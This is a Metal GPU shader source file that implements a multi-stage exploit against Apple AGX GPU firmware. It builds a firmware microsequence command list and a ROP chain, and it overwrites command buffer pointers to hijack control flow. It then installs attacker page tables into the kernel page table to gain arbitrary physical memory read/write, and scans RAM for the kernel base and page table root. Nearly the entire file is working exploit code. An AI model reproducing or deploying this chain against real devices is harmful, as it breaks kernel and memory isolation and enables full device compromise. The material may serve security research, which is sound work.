#include <metal_stdlib>
#include "types.h"
#include "constants.h"
#include "ops.h"

using namespace metal;

#define U8(p) (*(volatile device u8 *)(p))
#define U16(p) (*(volatile device u16 *)(p))
#define U32(p) (*(volatile device u32 *)(p))
#define U64(p) (*(volatile device u64 *)(p))

#define PU8(p) (*(volatile device u8 *)((p) | vg_phys_base))
#define PU16(p) (*(volatile device u16 *)((p) | vg_phys_base))
#define PU32(p) (*(volatile device u32 *)((p) | vg_phys_base))
#define PU64(p) (*(volatile device u64 *)((p) | vg_phys_base))

#define LA32(p) atomic_load_explicit((const device atomic_uint *)(p), memory_order_relaxed)
#define SA32(p, v) atomic_store_explicit((device atomic_uint *)(p), (v), memory_order_relaxed)

#define PTE_TABLE   0x00000000000003
#define PTE_PAGE    0xe000000000040b
#define PTE_BLOCK   0xe0000000000409
#define PTE_MASK    0x00000fffffc000

void memset64(u64 base, u64 val, u64 size)
{
    size &= ~7;
    while (size) {
        U64(base) = val;
        base += 8;
        size -= 8;
    }
}

void flush_pt(device u64* out, u64 addr)
{
    /*
     * Make sure this is flushed out before we do any other memory ops
     */
    threadgroup_barrier(mem_flags::mem_device);

    /*
     * Just for good measure, read it all back with atomics
     */
    for (u64 i = 0; i < SZ_16K; i += 4)
        out[1024 + i] = LA32(addr + i);
}

/*
 * Copy memory
 */
void memcpy(device void *dst, const device void *src, size_t size)
{
    device u64 *ps = (device u64 *)src;
    device u64 *pd = (device u64 *)dst;

    while (size >= 8) {
        *pd++ = *ps++;
        size -= 8;
    }

    u64 s = (u64)src;
    u64 d = (u64)dst;
    if (size >= 4) {
        U32(d) = U32(s);
        s += 4; d += 4; size -= 4;
    }
    if (size >= 2) {
        U16(d) = U16(s);
        s += 2; d += 2; size -= 2;
    }
    if (size >= 1) {
        U8(d) = U8(s);
    }
}

/*
 * Generic GPU virtual memory access functions
 */
kernel void writemem(device const u64* in, device u64* out)
{
    memcpy((device u64 *)in[0], &in[2], in[1]);
}

kernel void readmem(device const u64* in, device u64* out)
{
    memcpy(out, (device u64 *)in[0], in[1]);
}

/*
 * Page table walker
 */
u64 translate(u64 ttbr, u64 addr)
{
    u64 off = addr & (SZ_16K - 1);
    u64 l3i = addr >> SH_16K & (SZ_2K - 1);
    u64 l2i = addr >> SH_32M & (SZ_2K - 1);
    u64 l1i = addr >> SH_64G & (SZ_2K - 1);

    u64 l1pte = PU64(ttbr + l1i * 8);
    if ((l1pte & 3) != 3)
        return 0;

    u64 l2pte = PU64((l1pte & PTE_MASK) + l2i * 8);
    if ((l2pte & 3) != 3)
        return 0;

    u64 l3pte = PU64((l2pte & PTE_MASK) + l3i * 8);
    if ((l3pte & 3) != 3)
        return 0;

    return (l3pte & PTE_MASK) | off;
}

/*
 * CPU virtual memory access functions
 */
kernel void vwritemem(device const u64* in, device u64* out)
{
    u64 ttbr = in[0];
    u64 v = in[1];
    u64 size = in[2];
    u64 src = (u64)&in[3];

    while (size) {
        u64 boundary = (v + SZ_16K) & ~(SZ_16K - 1);
        u64 block = min(size, boundary - v);
        u64 p = translate(ttbr, v);
        if (!p)
            break;
        memcpy((device void *)(p | vg_phys_base), (device void *)src, block);
        v += block;
        src += block;
        size -= block;
    }
}

kernel void vreadmem(device const u64* in, device u64* out)
{
    u64 ttbr = in[0];
    u64 v = in[1];
    u64 size = in[2];
    u64 dst = (u64)out;

    while (size) {
        u64 boundary = (v + SZ_16K) & ~(SZ_16K - 1);
        u64 block = min(size, boundary - v);
        u64 p = translate(ttbr, v);
        if (!p)
            break;
        memcpy((device void *)dst, (device void *)(p | vg_phys_base), block);
        v += block;
        dst += block;
        size -= block;
    }
}

/*
 * Build the exploit MSQ command list and ROP buffer
 */
u64 build_cmdlist(u64 scratch, u64 dbg, thread u64 *mseq_cmdlist_size)
{
    u64 p = scratch;

#define P8(x) (U8(p) = (x), p += 1, p - 1)
#define P16(x) (U16(p) = (x), p += 2, p - 2)
#define P32(x) (U32(p) = (x), p += 4, p - 4)
#define P64(x) (U64(p) = (x), p += 8, p - 8)
#define DUMMY(y) \
    P64(0xdeaddead0000UL | (step << 56)); \
    for(u64 i = 1; i < y; i++) \
        P64(0xdead0000UL | i);
#define X(y) P64(0x00bbbbbbbb000000UL | (0x##y) | (step << 56))

    /* Space for post-exploit globals */
    /* g_p_kpt0 */      P64(0);
    /* g_p_tmp_pt */    P64(0);
    /* g_p_ram_start */ P64(0);
    /* g_ram_size */    P64(0);

    /* Debugging */
    u64 dbg_v_flags     = P64(0);
    u64 dbg_v_stampidx  = P64(0);
    u64 dbg_v_cmdq      = P64(0);
    u64 dbg_v_cmdst     = P64(0);

    /* Temporary storage */
    u64 tmp_v_cmdbuf    = P64(0);

    /* Addresses used by sequencer and ROP chain */
    u64 pg_stack_pivot      = P64(g_stack_pivot);
    u64 ppg_stack_pivot     = P64(pg_stack_pivot);
    u64 pg_store            = P64(g_store);
    u64 pg_epilogue         = P64(g_epilogue);
    u64 pg_uppl_call        = P64(g_uppl_call);

    /* uPPL map call arguments */
    u64 uppl_map_args =
        /* va */    P64(v_ttbat >> 14);
        u64 vpg_ttbat =
        /* pa */    P64(0);
        /* sz */    P64(1);
        /* prot */  P64(0x41b); // EL1 RW Shared
        /* unk */   P64(0);

    /* uPPL map call op */
    u64 uppl_map_op =
        /* op */    P64(UPPL_MAP);
        /* args */  P64(uppl_map_args);

    /* uPPL switch call arguments */
    u64 uppl_switch_args =
        /* unk */   P32(0);
        /* ctx */   P32(63); // xxx maybe use current ctx?

    /* uPPL switch call op */
    u64 uppl_switch_op =
        /* op */    P64(UPPL_SWITCH_TTBR0);
        /* args */  P64(uppl_switch_args);

    /* Align alt stack base */
    p = (p + 0xfful) & ~0xfful;

    /* ROP secondary stack buffer */
    u64 step = 0;
    u64 new_sp =
        /*
         * Set the TTB0 for context 63
         * Coming from g_calltwo
         */
        /* pad */   DUMMY(8);
        /* x26x0 */ u64 new_ttb = X(26);        /* val */
        /* x25 */   X(25);
        /* x24 */   X(24);
        /* x23 */   P64(v_ttb0_63 - 0xa78);     /* addr */
        /* x22 */   X(22);
        /* x21 */   P64(pg_store - 0x70);       /* func */
        /* x20 */   X(20);
        /* x19 */   X(19);
        /* x29 */   X(29);
        /* lr */    P64(g_callone);             /* gadget */

        step = 1;
        /*
         * Switch to context 63 (uPPL call)
         * Coming from g_store
         */
        /* x26x0 */ P64(uppl_switch_op);        /* uppl op */
        /* x25 */   X(25);
        /* x24 */   X(24);
        /* x23 */   X(23);
        /* x22 */   X(22);
        /* x21 */   P64(pg_uppl_call - 0x70);   /* func */
        /* x20 */   X(20);
        /* x19 */   X(19);
        /* x29 */   X(29);
        /* lr */    P64(g_callone);             /* gadget */

        step = 2;
        /*
         * Install our page table in the kernel space
         * Coming from g_callone
         */
        /* pad */   DUMMY(8);
        /* x26x0 */ u64 ktp_pte_val = X(26);    /* val */
        /* x25 */   X(25);
        /* x24 */   X(24);
        /* x23 */   u64 kpt_pte_addr = X(23);   /* addr */
        /* x22 */   X(22);
        /* x21 */   P64(pg_store - 0x70);       /* func */
        /* x20 */   X(20);
        /* x19 */   X(19);
        /* x29 */   X(29);
        /* lr */    P64(g_callone);             /* gadget */

        step = 3;
        /*
         * Restore the stack slots we clobbered
         * Coming from g_store
         */
#define RESTORE_REG(p, name) \
        /* x26x0 */ u64 name = X(26);           /* val */ \
        /* x25 */   X(25); \
        /* x24 */   X(24); \
        /* x23 */   P64(p - 0xa78);             /* addr */ \
        /* x22 */   X(22); \
        /* x21 */   P64(pg_store - 0x70);       /* func */ \
        /* x20 */   X(20); \
        /* x19 */   X(19); \
        /* x29 */   X(29); \
        /* lr */    P64(g_callone);             /* gadget */

        RESTORE_REG(v_x21, save_x21);
        RESTORE_REG(v_x22, save_x22);
        RESTORE_REG(v_x23, save_x23);
        RESTORE_REG(v_x26, save_x26);
        RESTORE_REG(v_lr, save_lr);

        step = 4;
        /*
         * Return to original stack
         * Coming from g_store
         */
        /* x26x0 */ P64(0);                     /* ret */
        /* x25 */   X(25);
        /* x24 */   X(24);
        /* x23 */   P64(sp);                    /* sp */
        /* x22 */   P64(ppg_stack_pivot);       /* 1st func */
        /* x21 */   P64(pg_epilogue - 0x70);    /* 2nd func */
        /* x20 */   X(20);
        /* x19 */   X(19);
        /* x29 */   X(29);
        /* lr */    P64(g_calltwo);             /* gadget */

        /* End of ROP sequence */

#define S64(op, a)  P32(MSQ_##op); P64(a)
#define S32(op, a)  P32(MSQ_##op); P32(a)
#define MSQ(op)     P32(MSQ_##op)
#define W64(a, v)   P32(MSQ_WRITE64); P64(a); P64(v)
#define W32(a, v)   P32(MSQ_WRITE32); P64(a); P32(v)

    /* Align MSQ */
    p = (p + 0xfful) & ~0xfful;

    /* Microsequence command list */
    u64 mseq_cmdlist =
        /*
         * Calculate pfn of the TTBAT page
         */
        /* Load v_gptbat_base, which is a firmware variable
         * That contains the physical address of the TTBAT. */
        S64(LOAD64, v_gptbat_base);
        /* Divide by 16K (shift right by 14) to get the "page number" */
        S64(LSRL(0,0), 14);
        /* Store in vpg_ttbat */
        S64(STORE64, vpg_ttbat);

        /*
         * Calculate physaddr of the kpte to overwrite
         */
        /* Load v_kpt_pfn, which is a firmware variable
         * That contains the "page number" of the top
         * level kernel/firmware page table (TTB1). */
        S64(LOAD64, v_kpt_pfn);
        /* Multiply by 16K (shift left by 14) to get address */
        S64(LSLL(0,0), 14);
        /* Store in g_p_kpt0 */
        S64(STORE64, g_p_kpt0);
        /* Invert to subtract by adding */
        S64(XORL(0,0), 0xffffffffffffffff);
        /* Subtract 0xa78 (stupid store gadget offset),
         * but add add 8 * 4 to get to PTE #4 */
        MSQ(ADD16(0, 0, 0xa78 - 8 * 4));
        /* Invert again to restore */
        S64(XORL(0,0), 0xffffffffffffffff);
        /* Store in kpt_pte_addr */
        S64(STORE64, kpt_pte_addr);

        /*
         * Read the page tables to find the paddr of our new PT,
         * and generate the PTEs and TTBR
         */
        /* Load the PTE for the page we'll use for scratch */
        S64(LOAD64, v_kpt0 + ((v_tmp_pt >> 14) & 0x7ff) * 8);
        /* Remove flag bits */
        S64(ANDL(0,0), 0xfffffffc000);
        /* Store it in g_p_tmp_pt */
        S64(STORE64, g_p_tmp_pt);
        /* TTB needs bit 0 set (valid), so OR it */
        S64(ORL(0,0), 1);
        /* Store in new_ttb */
        S64(STORE64, new_ttb);
        /* PT entries need bits 0,1 set (table), so OR it. */
        S64(ORL(0,0), 2);
        /* Store it in ktp_pte_val */
        S64(STORE64, ktp_pte_val);

        /*
         * Note: PTE 0 in the new page table is self-referential.
         * This makes it work at any translation level, so we
         * don't need separate page tables!
         */
        /* Also store it in the new page table entry #0 itself */
        S64(STORE64, v_tmp_pt);

        /*
         * The AGX MMU does not like 32M huge pages.
         * In order to let the shader continue the work, make
         * these 16K mappings:
         *   0x10000 -> tmp_pt
         *   0x14000 -> kpt0
         *   0x18000 -> physmem page 0
         */
        /* Add in access bits for a GPU-writable page */
        S64(ORL(0,0), PTE_PAGE);
        /* Store it in slot 4 (16K * 4 = 0x10000) */
        S64(STORE64, v_tmp_pt + 8 * 4);
        /* Load the physical address of the firmware PT */
        S64(LOAD64, g_p_kpt0);
        /* Add in access bits for a GPU-writable page */
        S64(ORL(0,0), PTE_PAGE);
        /* Store it in slot 5 (16K * 5 = 0x14000) */
        S64(STORE64, v_tmp_pt + 8 * 5);
        /* Directly map the beginning of RAM (0x800000000)
         * in slot 6 (16K * 6 = 0x18000) */
        W64(v_tmp_pt + 8 * 6, PTE_PAGE | p_ram_base);

        /*
         * Map physical 32M pages at 0, 32M, 8G-32M, 16G-32M
         * This should be enough to make the exploit work
         * regardless of RAM size.
         *
         * Map these physical 32M hugepages at indices 0x400 + n
         * (0x400 * 32M = 0x800000000 which is the same offset as
         * the phys addr).
         *
         * This means the firmware can just do
         * (phys addr) | v_phys_base (0xffffffc000000000)
         * to access this part of physical memory.
         */
#define MAP_PHYS_32M(page) \
        W64(v_tmp_pt + 0x2000 + 8 * (u64)page, PTE_BLOCK | p_ram_base | ((u64)page << 25))

        MAP_PHYS_32M(0);
        MAP_PHYS_32M(1);
        MAP_PHYS_32M(255);
        MAP_PHYS_32M(511);

        /*
         * Locate the current command buffer state pointer
         *
         * We need this to build a correct FINISH COMPUTE
         * command...
         */

        /* === Indirect load trick === */
#define INDIRECT(op) P32(MSQ_STORE64); P64(p + 8 + 4); S64(op, 0x55550000)

        /* Load the current command state pointer from firmware */
        S64(LOAD64, v_cur_cmd_state);
        /* Offset 0x10 into the structure */
        MSQ(ADD16(0, 0, 0x10));
        /* Indirect load from that!
         * This is now the command buffer pointer */
        INDIRECT(LOAD64);
        /* Clear the bottom bits which have flags */
        S64(ANDL(0,0), 0xffffffffffffffe0);
        /* Store in tmp_v_cmdbuf */
        S64(STORE64, tmp_v_cmdbuf);

        /* Macro to load from a point in the command buffer */
#define LOAD_CMDBUF(width, off, dest) \
        S64(LOAD64, tmp_v_cmdbuf); \
        MSQ(ADD16(0, 0, off)); \
        INDIRECT(LOAD##width); \
        P32(MSQ_STORE##width); \
        /* addr */  u64 dest = P64(0)

        /* Macro to calculate an offset into the command buffer */
#define OFF_CMDBUF(off, dest) \
        S64(LOAD64, tmp_v_cmdbuf); \
        MSQ(ADD16(0, 0, off)); \
        P32(MSQ_STORE64); \
        /* addr */  u64 dest = P64(0)

        /*
         * Grab info from the cmdbuf and put it in the FINISH op
         * We need the stamp address, value, and context ID
         * for this to work properly.
         */
        LOAD_CMDBUF(64, off_stamp_addr,     pstamp_addr);
        LOAD_CMDBUF(32, off_stamp_value,    pstamp_val);
        LOAD_CMDBUF(32, off_context,        pcontext);

        /* And we also need pointers into the Compute Info 2
         * and some flag parts of the command buffer */
        OFF_CMDBUF(off_cp_info2,    pcp_info2_addr);
        OFF_CMDBUF(off_flag,        pflag_addr);

        /*
         * But we also need the command queue pointer!
         *
         * Find the current cmdqueue. This is fun since we need
         * to index into the stamp state structure, dynamically.
         */

        /*
         * First, get the stamp index from the cmd state struct
         */
        /* Load the current command state pointer */
        S64(LOAD64, v_cur_cmd_state);
        /* Field at 0x4 = flags */
        MSQ(ADD16(0, 0, 0x4));
        /* Indirect load the flags! */
        INDIRECT(LOAD32);
        /* Store into dbg_v_flags for debug */
        S64(STORE64, dbg_v_flags);
        /* Shift right by 14 bits */
        S64(LSRL(0, 0), 14);
        /* And AND with 0x7f to get stamp index */
        S64(ANDL(0, 0), 0x7f);
        /* Store into dbg_v_stampidx for debug */
        S64(STORE64, dbg_v_stampidx);

        /* === Multiply trick === */
        /*
         * Negate (two's complement)
         * This makes the counter easier since there is only add,
         * not subtract.
         */
        S64(XORL(0, 0), 0xffffffffffffffff);
        MSQ(ADD16(1, 0, 1)); /* Dest in r1 */

        /*
         * We need to multiply by 0x38, but there is no mul,
         * so let's use an add loop
         */

        /* Load the v_stamp_states address + 0x18 into R0
         * We need to do this silly thing because there is no
         * load immediate op!! (we could load it indirectly
         * too I guess...) */
        S64(ANDL(0, 0), 0);
        S64(ORL(0, 0), v_stamp_states + 0x18);

        /* Multiply! */
        u64 loop =                  /* loop: */
            MSQ(TESTZ(1));          /*     if (r1 == 0) */
            MSQ(CJMP(16));          /*         goto $ + 4; */
            MSQ(ADD16(0, 0, 0x38)); /*     r0 += 0x38; */
            MSQ(ADD16(1, 1, 1));    /*     r1 += 1; */
            MSQ(JMP(loop - p));     /*     goto loop; */

        /* Now we have &v_stamp_states[index].cmdq */

        /* Load the cmdq pointer */
        INDIRECT(LOAD64);
        /* Save it for debug */
        S64(STORE64, dbg_v_cmdq);
        /* And store it into the FINISH op
         * (this gets filled in later) */
        P32(MSQ_STORE64); \
        /* addr */  u64 pcmdq_addr = P64(0);

        /*
         * Save the stack values we will clobber
         * so we can restore them and not crash
         */
#define MOVE64(dst, src) \
        S64(LOAD64, src); \
        S64(STORE64, dst)

        MOVE64(save_lr, v_lr);
        MOVE64(save_x21, v_x21);
        MOVE64(save_x22, v_x22);
        MOVE64(save_x23, v_x23);
        MOVE64(save_x26, v_x26);

        /*
         * Set up our initial ROP stack pivot and 2nd op
         * (uPPL map TTBAT).
         */
        /* Write x21 stack slot */
        W64(v_x21, pg_uppl_call - 0x70);
        /* Write x22 stack slot */
        W64(v_x22, ppg_stack_pivot);
        /* Write x23 stack slot */
        W64(v_x23, new_sp);
        /* Write x26 stack slot */
        W64(v_x26, uppl_map_op);
        /* Write return address stack slot */
        W64(v_lr, g_calltwo);

        /* Save command state for debug */
        MOVE64(dbg_v_cmdst, v_cur_cmd_state);

        /*
         * Do a normal compute finish/cleanup command.
         * This prepares the stamps for retirement and leaves things
         * in the right state. Otherwise the firmware crashes!!
         *
         * Note that the compute pass was never started, so the shader
         * for this command buffer never gets executed, which we use
         * as a signal that the exploit worked.
         *
         * This updates all the pointers above to point into this
         * command, so the code can self-modify it when it runs and
         * fill in all the missing data.
         */
        MSQ(FINISH_CP);
            /* stats */ P64(v_cp_stats);
            /* cmdq */  U64(pcmdq_addr) = P64(0);
            /* ctx */   U64(pcontext) = P32(0);
            /* info2 */ U64(pcp_info2_addr) = P64(0);
            /* unk */   P32(0);
            /* uuid */  P32(0xc0ffee);
            /* stamp */ U64(pstamp_addr) = P64(0xaaaa0000);
            /* val */   U64(pstamp_val) = P32(0xbbbb0000);
            /* unk */   P64(0); P64(0); P64(0); P64(0); P32(0);
            /* off */   P32(0);
            /* unk */   P32(1); P32(0); P64(0); P8(0);
            /* pflag */ U64(pflag_addr) = P64(0xdddd0000);
            /* pad */   P8(0); P16(0); P32(0);

        /*
         * Finish the microsequence and return from the processor
         * function.
         *
         * This launches the ROP chain!
         */
        MSQ(RETIRE);

        /* Should never get here */
        W64(0xdeadbeef, 0xb4dc0de);

    *mseq_cmdlist_size = p - mseq_cmdlist;
    return mseq_cmdlist;
}

/*
 * Exploit stage 1: get access to a page table from the GPU
 */
u64 stage1_main(volatile device const u64* in, volatile device u64* out)
{
    out[0] = 1;

    /* Build the exploit and MSQ command list */
    u64 mseq_cmdlist, mseq_cmdlist_size;
    mseq_cmdlist = build_cmdlist(v_scratch, (u64)&out[8], &mseq_cmdlist_size);

    /* Now try to overwrite all the command buffer
     * microsequence pointers a bunch of times */
    out[0] = 1;
    u64 p;
    for (int i = 0; i < 20; i++) {
        for (p = v_cmdbufs_start + off_mseq_addr;
             p < v_cmdbufs_end; p += cmdbuf_size) {
            // Overwrite the pointer
            U64(p) = mseq_cmdlist;
            // Try to flush it, do some barrier and random stuff
            threadgroup_barrier(mem_flags::mem_device);
            out[1023] = LA32(p);
            // We don't really need this part
            // U64(p + 8) = mseq_cmdlist_size;
        }
        // Do more random stuff to try to flush memory
        for (u64 j = 0; j < 0x10000; j++) {
            out[1024+j] = in[j];
        }
    }

    out[0] = 0xffff;

    return 1;
}

kernel void stage1(volatile device const u64* in,
                    volatile device u64* out)
{
    u32 whoami = in[0];

    if (U64(g_p_kpt0) != 0)
    {
        /* Already done, skip stage 1 */
        if (whoami == 1) {
            out[512] = 0xffff;
        } else {
            out[whoami] = 0;
        }
        return;
    }

    if (whoami == 1) {
        out[whoami] = stage1_main(in, out + 512);
    } else {
        /* Just spin for a bit */
        for (int i = 0; i < 0x40000; i++) {
            out[0] = i | ((u64)whoami << 32);
        }
        out[whoami] = 1;
    }
}

/*
 * Exploit stage 2: get full physical memory R/W access from the GPU
 */
kernel void stage2(device const uint64_t* in, device uint64_t* out)
{
    out[0] = 1;

    /*
     * Grab globals from stage 1
     */
    u64 p_kpt0      = U64(v_scratch + 0);
    u64 p_tmp_pt    = U64(v_scratch + 8);

    /* kpt0 is always near the top of RAM, so align to get RAM size */
    u64 p_ram_top   = (p_kpt0 + SZ_32M) & ~(SZ_32M - 1);

    out[1] = p_kpt0;
    out[2] = p_tmp_pt;
    out[3] = p_ram_top;

    if (!p_kpt0 || !p_tmp_pt) {
        out[0] = 0x101;
        return;
    }
    out[0] = 2;

    /*
     * Check the page 0 magic
     */
    if (U32(vg_page0) != 0x484f6666) {
        out[0] = 0x102;
        return;
    }
    out[0] = 3;

    /*
     * Grab the carveout map offset from header
     */
    u32 homm_off = U32(vg_page0 + 0x20);
    if (homm_off < 0x20 || homm_off >= 0x4000) {
        out[0] = 0x103;
        return;
    }

    u64 vg_homm = vg_page0 + homm_off;

    out[4] = vg_homm;
    out[0] = 4;

    /*
     * Check carveout map magic
     */
    if (U32(vg_homm) != 0x686f6d6d) {
        out[0] = 0x104;
        return;
    }
    out[0] = 5;

    /*
     * Look through the carveout map to find VRAM and main RAM
     * VRAM is only used for the boot framebuffer, so it's an excellent
     * place to stash our pile of page tables where they will remain
     * undisturbed and disturb nobody else.
     */
    u32 homm_cnt = U32(vg_homm + 0xc);
    u32 homm_esz = U32(vg_homm + 0x10);
    u32 homm_hsz = U32(vg_homm + 0x14);

    out[5] = homm_cnt;
    out[6] = homm_esz;
    out[7] = homm_hsz;

    u64 p_vram_start = 0;
    u64 vram_size = 0;
    u64 p_ram_start = 0;
    u64 ram_size = 0;

    for (u32 i = 0; i < homm_cnt; i++) {
        u64 vg_ent = vg_homm + homm_hsz + i * homm_esz;
        switch (U32(vg_ent + 0x00)) {
            case homm_id_fb:
                p_vram_start = U64(vg_ent + 0x08);
                vram_size = U64(vg_ent + 0x10);
                break;
            case homm_id_ram:
                p_ram_start = U64(vg_ent + 0x08);
                ram_size = U64(vg_ent + 0x10);
                break;
        }
    }

    U64(g_p_ram_start) = p_ram_start;
    U64(g_ram_size) = ram_size;

    u64 p_ram_end = p_ram_start + ram_size;

    out[8] = p_vram_start;
    out[9] = vram_size;
    out[10] = p_ram_start;
    out[11] = ram_size;

    if (!p_vram_start || !vram_size || !p_ram_start || !ram_size) {
        out[0] = 0x105;
    }
    out[0] = 6;

    /*
     * We're going to set up new page tables.
     * To map 16GB of RAM we need 512 L3 tables / L2 PTEs.
     * We'll use the first page of VRAM as L2, and follow with L3s.
     */
#define NUM_PTS 512
    u64 p_l2_pt = p_vram_start;
    u64 p_l3_pt = p_vram_start + 0x4000;

    /*
     * To set up these PTs, we need to put them into our existing
     * page table. Let's put the root PT at PTE 7, and the rest
     * starting at PTE 8.
     */
    u64 vg_pte = vg_tmp_pt + (7 * 8);
    U64(vg_pte) = PTE_PAGE | p_l2_pt;

    vg_pte += 8;
    for (u64 i = 0; i < NUM_PTS; i++, vg_pte += 8)
        U64(vg_pte) = PTE_PAGE | (p_l3_pt + i * SZ_16K);

    out[0] = 7;

    flush_pt(out, vg_tmp_pt);

    out[0] = 8;

    /*
     * Clear out our new page tables
     */
    memset64(vg_l2_pt, 0, SZ_16K);
    memset64(vg_l3_pt, 0, SZ_16K * NUM_PTS);

    out[0] = 9;
    /*
     * Make the L2 PTEs. We offset these by p_ram_base so that is included
     * in the resulting vaddr, just like we did in the second half of the
     * temporary PT.
     */
    vg_pte = vg_l2_pt + (p_ram_base >> SH_32M) * 8;
    for (u64 i = 0; i < NUM_PTS; i++, vg_pte += 8)
        U64(vg_pte) = PTE_TABLE | (p_l3_pt + i * SZ_16K);

    out[0] = 10;

    /*
     * Make the L3 PTEs.
     */
    vg_pte = vg_l3_pt + ((p_ram_start - p_ram_base) >> SH_16K) * 8;
    for (u64 i = p_ram_start; i < p_ram_end; i += SZ_16K, vg_pte += 8)
        U64(vg_pte) = PTE_PAGE | i;

    /*
     * Flush everything so far
     */
    out[0] = 11;
    flush_pt(out, vg_l2_pt);

    out[0] = 12;
    for (u64 i = 0; i < NUM_PTS; i++)
        flush_pt(out, vg_l3_pt + (i * SH_16K));

    out[0] = 13;

    /*
     * Finally, install the L2 PT into the GPU's kernel L1 PT
     */
    U64(vg_kpt0 + 6 * 8) = PTE_TABLE | p_l2_pt;
    flush_pt(out, vg_kpt0);

    out[0] = 14;

    /*
     * Did it work? Let's write something.
     */
    PU64(p_ram_start) = magic;

    out[0] = 0xffff;
}

/*
 * Find the kernel base
 */
kernel void find_kbase(device const uint64_t* in, device uint64_t* out)
{
    bool found = false;
    u64 p;

    out[0] = 1;

    u64 p_ram_start = U64(g_p_ram_start);
    u64 ram_size = U64(g_ram_size);
    u64 p_ram_end = p_ram_start + ram_size;

    for (p = p_ram_start; p < p_ram_end; p += SZ_16K) {
        if (PU32(p) == 0xFEEDFACF) {
            found = true;
            break;
        }
    }

    out[1] = p;

    if (!found) {
        out[0] = 0x101;
        return;
    }

    out[0] = 0xffff;
}

/*
 * Find the kernel page table base
 */
kernel void find_kttbr1(device const uint64_t* in, device uint64_t* out)
{
    bool found = false;
    u64 p;

    out[0] = 1;

    u64 p_ram_start = U64(g_p_ram_start);
    u64 ram_size = U64(g_ram_size);
    u64 p_ram_end = p_ram_start + ram_size;

    for (p = p_ram_start; p < p_ram_end; p += SZ_16K) {
        /* Quick check, first half needs to be empty */
        if (PU64(p + 0)) continue;
        /* Look for these two PTEs */
        u64 expect_pte0 = 0x3800000000000003 | (p + 2 * SZ_16K);
        u64 expect_pte1 = 0x2000000000000003 | (p + SZ_16K);

        if (PU64(p + 0x3ef8) != expect_pte0)
            continue;
        if (PU64(p + 0x3f00) != expect_pte1)
            continue;
        found = true;
        break;
    }

    out[1] = p;

    if (!found) {
        out[0] = 0x101;
        return;
    }

    out[0] = 0xffff;
}
